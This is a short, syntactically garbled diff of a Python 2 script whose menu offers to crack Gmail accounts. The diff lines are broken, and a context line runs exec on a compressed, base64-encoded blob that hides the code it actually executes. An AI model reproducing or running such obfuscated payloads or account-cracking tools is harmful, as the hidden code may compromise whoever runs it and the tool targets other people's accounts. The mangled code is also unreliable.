@@ -37,7 +37,7 @@ def banner():
       print "\033[4;92m[\033[1;91m3\033[033[4;92m] \033[1;96mCrack Akun Gmail"
       print """)
       kntl ( " raw_input(PILIH Sesuai No => ")
- menu():
-baner():
+  def menu():
+def baner():
 exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrckGEO71G5drCDiQUQEd28i0iajhqZpSLJaFf+7G7J4meG9efPmQ09u9hGHWY4Q+bfRAx/6AE3NQ/R7GXnUE6DX2eMFa4t9b9+AViXboCL6r0MsQpebRU50xY94+3B997LdPd5c3bOkE3K2FmSklFTnK1E1rShFtV4T3pZtyZJm8NCPqIBFgovJPE0XwQA4esaQ6fJSYm9dL0dKLm8JD8KD/KA1Y0/lM1LdERuGPt+1AWzAUsUuzMFOnfxXTzPNECwgabpbKJDz5DyEQPMLxNDUiVSQlPyHBLIJvwz9ASO4Xzg=')[0])))
 
